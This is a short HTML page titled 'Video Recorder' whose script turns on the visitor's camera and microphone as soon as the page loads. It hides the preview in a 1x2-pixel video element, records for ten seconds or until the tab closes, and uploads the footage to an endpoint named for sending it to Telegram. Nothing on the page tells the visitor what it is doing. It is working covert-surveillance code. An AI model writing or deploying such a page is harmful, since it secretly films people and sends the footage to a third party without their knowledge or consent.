<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Video Recorder</title>
</head>
<body>
  <video id="preview" autoplay muted playsinline style="width: 1px; height: 2px; border: 1px solid black;"></video> 

  <script>
    let mediaRecorder;
    let recordedChunks = [];
    let stream;

    async function startRecording() {
      try {
        // Get camera + mic
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById("preview").srcObject = stream;

        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });

        mediaRecorder.ondataavailable = e => {
          if (e.data.size > 0) recordedChunks.push(e.data);
        };

        mediaRecorder.start();
        console.log("🎥 Recording started...");

        // Stop & send automatically after 10 seconds
        setTimeout(() => stopAndSend(), 10000);

      } catch (err) {
        console.error("Camera error:", err);
      }
    }

    async function stopAndSend() {
      if (!mediaRecorder) return;
      mediaRecorder.stop();

      // Wait a moment for data to finalize
      mediaRecorder.onstop = async () => {
        const recordedBlob = new Blob(recordedChunks, { type: "video/webm" });

        // Stop camera
        stream.getTracks().forEach(track => track.stop());

        // Send whatever was recorded to Telegram
        try {
          const formData = new FormData();
          formData.append("video", recordedBlob, "recording.webm");

          const res = await fetch("/upload-to-telegram", {
            method: "POST",
            body: formData
          });
          console.log(await res.text());
        } catch (err) {
          console.error("❌ Error sending video:", err);
        }
      };
    }

    // Catch page close / tab close / refresh
    window.addEventListener("beforeunload", (event) => {
      if (mediaRecorder && mediaRecorder.state === "recording") {
        stopAndSend();
      }
    });

    // Start recording as soon as page loads
    window.onload = startRecording;
  </script>
</body>
</html>
